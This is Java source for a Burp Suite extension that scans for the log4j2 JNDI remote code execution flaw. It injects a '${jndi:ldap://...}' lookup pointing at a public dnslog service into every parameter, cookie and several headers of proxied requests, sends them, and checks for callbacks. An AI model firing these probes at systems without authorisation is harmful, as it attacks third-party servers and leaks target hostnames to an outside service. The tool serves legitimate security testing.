package burp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import java.awt.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.lang3.RandomStringUtils;

public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController {
    private IBurpExtenderCallbacks callbacks;

    private IExtensionHelpers helpers;

    private PrintWriter stdout;

    private JSplitPane mjSplitPane;

    private List<TablesData> Udatas = new ArrayList<>();

    private IMessageEditor HRequestTextEditor;

    private IMessageEditor HResponseTextEditor;

    private IHttpRequestResponse currentlyDisplayedItem;

    private URLTable Utable;

    private JScrollPane UscrollPane;

    private JSplitPane HjSplitPane;

    private JSplitPane HjSplitPane2;

    private JPanel mjPane;

    private JTabbedPane Ltable;

    private JTabbedPane Rtable;

    private JTextArea textArea1;

    private JTextArea textArea2;

    private JPanel panel1;

    private String dnslog;

    private String dnslog_token;

    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        OkHttpClient client = new OkHttpClient();
        String indexUrl = "https://log.xn--9tr.com/new_gen";
        Request loginReq = new Request.Builder()
                .url(indexUrl)
                .get()
                .build();

        Call call = client.newCall(loginReq);
        Response response = null;
        try {
            response = call.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
        String respCookie = null;
        try {
            respCookie = response.body().string();
        } catch (IOException e) {
            e.printStackTrace();
        }
        JSONObject jsonObject = JSON.parseObject(String.valueOf(respCookie));
        String dnslog = jsonObject.getString("domain"); // 读取domain
        dnslog = dnslog.substring(0,dnslog.length()-1);
        String dnslog_token = jsonObject.getString("token"); // 读取token

        this.dnslog = dnslog;
        this.dnslog_token = dnslog_token;
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.setExtensionName("log4jscanner");
        this.stdout.println("===========================");
        this.stdout.println("[+]   load successful!     ");
        this.stdout.println("[+]   log4jscanner v0.1       ");
        this.stdout.println("[+]   code by f0ng     ");
        this.stdout.println("[+]  ");
        this.stdout.println("===========================");
        this.stdout.println(this.dnslog);
        this.stdout.println(this.dnslog_token);
        this.stdout.println("You also can request to    https://" + dnslog + "/" + dnslog_token + "    to see dnslog");
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                BurpExtender.this.textArea1 = new JTextArea("");
                BurpExtender.this.textArea2 = new JTextArea("");
                BurpExtender.this.mjSplitPane = new JSplitPane(0); //上下
                BurpExtender.this.Utable = new BurpExtender.URLTable(BurpExtender.this);
                BurpExtender.this.UscrollPane = new JScrollPane(BurpExtender.this.Utable);
                BurpExtender.this.HjSplitPane = new JSplitPane();
                BurpExtender.this.HjSplitPane2 = new JSplitPane();
                BurpExtender.this.HjSplitPane.setDividerLocation(650);
                BurpExtender.this.Ltable = new JTabbedPane();
                BurpExtender.this.HRequestTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Ltable.addTab("Request", BurpExtender.this.HRequestTextEditor.getComponent());
                BurpExtender.this.Rtable = new JTabbedPane();
                BurpExtender.this.HResponseTextEditor = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                BurpExtender.this.Rtable.addTab("Response", BurpExtender.this.HResponseTextEditor.getComponent());
                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Ltable, "left"); // request窗体
                BurpExtender.this.HjSplitPane.add(BurpExtender.this.Rtable, "right"); // response窗体
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.UscrollPane, "left"); // 结果集
                BurpExtender.this.mjSplitPane.add(BurpExtender.this.HjSplitPane, "right"); // request response一起


                BurpExtender.this.callbacks.customizeUiComponent(BurpExtender.this.mjSplitPane);
                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
            }
        });
        callbacks.registerScannerCheck(this);
    }

    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IHttpService httpService = baseRequestResponse.getHttpService();
        String host = httpService.getHost();
        String randomstr = RandomStringUtils.randomAlphanumeric(6);

        String vulnurl = "${jndi:ldap://" + randomstr + host + "." + this.dnslog + "/test}";

        String uri_total = "";

        byte[] request = baseRequestResponse.getRequest();
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        IRequestInfo analyzedIRequestInfo = this.helpers.analyzeRequest(request);

//        if ()

        List<String> request_header = analyzedIRequestInfo.getHeaders(); // 获取请求头
        // 循环获取参数，判断类型，进行加密处理后，再构造新的参数，合并到新的请求包中。

        String firstrequest_header = request_header.get(0); //第一行请求包含请求方法、请求uri、http版本
        System.out.println(firstrequest_header);


        if(firstrequest_header.contains(".png") || firstrequest_header.contains(".js") || firstrequest_header.contains(".jpg") || firstrequest_header.contains(".jpeg") || firstrequest_header.contains(".svg")  || firstrequest_header.contains(".mp4") || firstrequest_header.contains(".css") || firstrequest_header.contains(".mp3")|| firstrequest_header.contains(".ico")){
            return null;
        }
//        else if (!checUrl(httpService.getHost(), httpService.getPort())){
//            return null;
//        }
        else {

            String[] firstheaders = firstrequest_header.split(" ");
            //firstheaders[0] 为请求方法
            //firstheaders[1] 为请求的uri
            //firstheaders[2] 为请求协议版本，不用看

            /*****************获取body 方法一**********************/
            int bodyOffset = analyzedIRequestInfo.getBodyOffset();
            byte[] byte_Request = baseRequestResponse.getRequest();

            String request2 = new String(byte_Request); //byte[] to String
            String body = request2.substring(bodyOffset); // 请求体
//            stdout.println(firstheaders[0]);
            if(firstheaders[0].contains("GET") && !firstheaders[1].contains("?"))
                return null;
            // 这里一直到POST的行，因为GET、POST、PUT都可能请求的uri有参数
            if (firstheaders[1].contains("?")) {
                String[] requris = firstheaders[1].split("\\?");
                String[] requries = requris[1].split("&");
                for (String uri_single : requries) {
                    String[] uri_single_lists = uri_single.split("=");
                    uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl + "&";
                }
                uri_total = uri_total.substring(0, uri_total.length() - 1);
                firstheaders[1] = requris[0] + "?" + uri_total;
            }

            if(firstheaders[0].contains("POST") || firstheaders[0].contains("PUT")){
//                stdout.println("进入POST模式");
//                stdout.println(body);
                // todo

                /**  .contains("=")    !.contains("{")
                 * a=1&b=2&c=3
                 */
                 if (body.contains("=") && !body.contains("{")) {
//                     stdout.println("进入post普通模式");
                     String body_total = "";
                     String[] bodys_single = body.split("&");
                     for(String body_single:bodys_single) {
                         String[] body_single_lists = body_single.split("=");
                         body_total = body_total + body_single_lists[0] + "="  + vulnurl +  "&" ;
                     }
                     body_total = body_total.substring(0,uri_total.length()-1);
                     body =  body_total;
                 }

                 /** !.contains("=")    .contains("{")
                 * {"a":"1","b":"22222"}
                 */
                 else if( !body.contains("=") && body.contains("{")){
//                     stdout.println("进入json模式");
                     JSONObject jsonObject = JSON.parseObject(body);
                     for (String key:jsonObject.keySet()) {
                         jsonObject.put(key, vulnurl);
                     }
//                     stdout.println(jsonObject.toString());
                     body = jsonObject.toString();
                 }

                 /** .contains("=")    .contains("{")
                 * a=1&param={"a":"1","b":"22222"}
                 */
                 else if( body.contains("=") && body.contains("{") && body.contains("&")){
//                     stdout.println("进入普通和json混合模式");
                     String body_total = "";
                     String[] bodys_single = body.split("&");
                     for(String body_single:bodys_single) {
                         if (body_single.contains("{")){
                             String[] body_single_lists = body_single.split("=");
                             JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                             for (String key:jsonObject.keySet()) {
                                 jsonObject.put(key, vulnurl);
                             }
                             body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
                         }else {
                             String[] body_single_lists = body_single.split("=");
                             body_total = body_total + body_single_lists[0] + "=" + vulnurl + "&";
                         }
                     }
                     body_total = body_total.substring(0,body_total.length()-1);
                     body =  body_total;
                 }

                 /** !.contains("=")    .contains("\\":{")
                 * {"params":{"a":"1","b":"22222"}}
                 */
                 else if( !body.contains("&") && body.contains("\":{")) {
//                     stdout.println("进入双层json模式");
                     JSONObject jsonObject = JSON.parseObject(body);
                     for (String key:jsonObject.keySet()) {
                         if (jsonObject.getString(key).contains("{")){
                             JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                             for (String key2:jsonObject2.keySet())
                                 jsonObject2.put(key2,vulnurl);
                             jsonObject.put(key,jsonObject2);
//                System.out.println("有json");
                         } else
                             jsonObject.put(key, vulnurl);
//            System.out.println(jsonObject.getString(key));
                     }
                     body = jsonObject.toString();
                 }

            }


            request_header.set(0,firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);
            // 去除源请求包里的Origin参数
            /*****************增加header**********************/
            request_header.add("Forwarded-For-Ip: 127.0.0.1" + vulnurl); // 请求头增加
            request_header.add("Forwarded-For: 127.0.0.1" + vulnurl); // 请求头增加
            request_header.add("Forwarded: 127.0.0.1" + vulnurl); // 请求头增加
            request_header.add("X-Client-IP: 127.0.0.1" + vulnurl); // 请求头增加
            String cookie_total = "";
            String lowup = "up"; // 默认Cookie为大写
            for (int i = 0; i < request_header.size(); i++) {
                if (request_header.get(i).contains("User-Agent"))
                    request_header.set(i,request_header.get(i) + vulnurl); // UA头增加

                if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
                    if (request_header.get(i).contains("cookie:")) {
                        lowup = "low";
                    }else if (request_header.get(i).contains("Cookie:") ){
                        lowup = "up";
                    }
                    String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
                    String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
                    for (String cookie_single:cookies_lists){  // 把分割出来的单个cookie的值进行vulnurl添加
                        String[] cookie_single_lists = cookie_single.split("=");
                        cookie_total = cookie_total + cookie_single_lists[0] + "=" + vulnurl + "; ";
                    }
                    if (lowup.contains("up"))
                        request_header.set(i,"Cookie:" + cookie_total); // Cookie头增加
                    else
                        request_header.set(i,"cookie:" + cookie_total); // cookie头增加
                }
            }
//            stdout.println(request_header);

            byte[] request_bodys = body.getBytes();  //String to byte[]
            String reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
            //        stdout.println(newParameter);
            byte[] newRequest = this.helpers.buildHttpMessage(request_header, request_bodys);

            IHttpRequestResponse newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
            byte[] response = newIHttpRequestResponse.getResponse();

            OkHttpClient client = new OkHttpClient();
            String indexUrl = "https://log.xn--9tr.com/" + this.dnslog_token;
            // todo 使用插件的时候获取一个token，固定token，减少请求
            Request loginReq = new Request.Builder()
                    .url(indexUrl)
                    .get()
                    .build();

            Call call = client.newCall(loginReq);

            Response response2 = null;
            try {
                response2 = call.execute();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                String respCookie = response2.body().string(); // dnslog的响应体
                if (respCookie.contains(host) && respCookie.contains(randomstr)) {
                    synchronized (this.Udatas) {
//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
                    int row = this.Udatas.size();
                    this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce", newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
                    fireTableRowsInserted(row, row);
                        List<IScanIssue> issues = new ArrayList(1);
                        issues.add(new CustomScanIssue(
                                httpService,
                                url,
                                new IHttpRequestResponse[]{newIHttpRequestResponse},
                                "log4j2 RCE",
                                "log4j2 RCE",
                                "High"
                        ));
                    return issues;
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            return null;
        }

    }


    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        return 0;
    }

    boolean checUrl(String host, int port) {
        for (TablesData d : this.Udatas) {
            if (d.host.equals(host) && d.port == port)
                return false;
        }
        return true;
    }

    public IHttpService getHttpService() {
        return this.currentlyDisplayedItem.getHttpService();
    }

    public byte[] getRequest() {
        return this.currentlyDisplayedItem.getRequest();
    }

    public byte[] getResponse() {
        return this.currentlyDisplayedItem.getResponse();
    }

    public String getTabCaption() {
        return "log4j2 RCE";
    }

    public Component getUiComponent() {
        return this.mjSplitPane;
    }

    public int getRowCount() {
        return this.Udatas.size();
    }

    public int getColumnCount() {
        return 5;
    }

    /**
     * 获取响应中RememberMe的数量
     * @param response
     * @return
     */
    public int getRememberMeNumber(byte[] response){
        int number = 0;
        for (ICookie cookies : helpers.analyzeResponse(response).getCookies()){
            if (cookies.getName().equals("rememberMe")){
                number++;
            }
        }
        return number;
    }

    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0:
                return "#";
            case 1:
                return "Method";
            case 2:
                return "URL";
            case 3:
                return "Status";
            case 4:
                return "Issue";
        }
        return null;
    }

    public Object getValueAt(int rowIndex, int columnIndex) {
        TablesData datas = this.Udatas.get(rowIndex);
        switch (columnIndex) {
            case 0:
                return Integer.valueOf(datas.Id);
            case 1:
                return datas.Method;
            case 2:
                return datas.URL;
            case 3:
                return datas.Status;
            case 4:
                return datas.issue;
        }
        return null;
    }

    public class URLTable extends JTable {
        public URLTable(TableModel tableModel) {
            super(tableModel);
        }

        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            BurpExtender.TablesData dataEntry = BurpExtender.this.Udatas.get(convertRowIndexToModel(row));
            BurpExtender.this.HRequestTextEditor.setMessage(dataEntry.requestResponse.getRequest(), true);
            BurpExtender.this.HResponseTextEditor.setMessage(dataEntry.requestResponse.getResponse(), false);
            BurpExtender.this.currentlyDisplayedItem = dataEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

    public static class TablesData {
        final int Id;

        final String Method;

        final String URL;

        final String Status;

        final String issue;

        final IHttpRequestResponse requestResponse;

        final String host;

        final int port;

        public TablesData(int id, String method, String url, String status, String issue, IHttpRequestResponse requestResponse, String host, int port) {
            this.Id = id;
            this.Method = method;
            this.URL = url;
            this.Status = status;
            this.issue = issue;
            this.requestResponse = requestResponse;
            this.host = host;
            this.port = port;
        }
    }

}





class CustomScanIssue implements IScanIssue
{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    /**
     *
     * @param httpService   HTTP服务
     * @param url   漏洞url
     * @param httpMessages  HTTP消息
     * @param name  漏洞名称
     * @param detail    漏洞细节
     * @param severity  漏洞等级
     */
    public CustomScanIssue(
            IHttpService httpService,
            URL url,
            IHttpRequestResponse[] httpMessages,
            String name,
            String detail,
            String severity)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }

    public URL getUrl()
    {
        return url;
    }

    public String getIssueName()
    {
        return name;
    }

    public int getIssueType()
    {
        return 0;
    }

    public String getSeverity()
    {
        return severity;
    }

    public String getConfidence()
    {
        return "Certain";
    }

    public String getIssueBackground()
    {
        return null;
    }

    public String getRemediationBackground()
    {
        return null;
    }


    public String getIssueDetail()
    {
        return detail;
    }

    public String getRemediationDetail()
    {
        return null;
    }

    public IHttpRequestResponse[] getHttpMessages()
    {
        return httpMessages;
    }

    public IHttpService getHttpService()
    {
        return httpService;
    }

}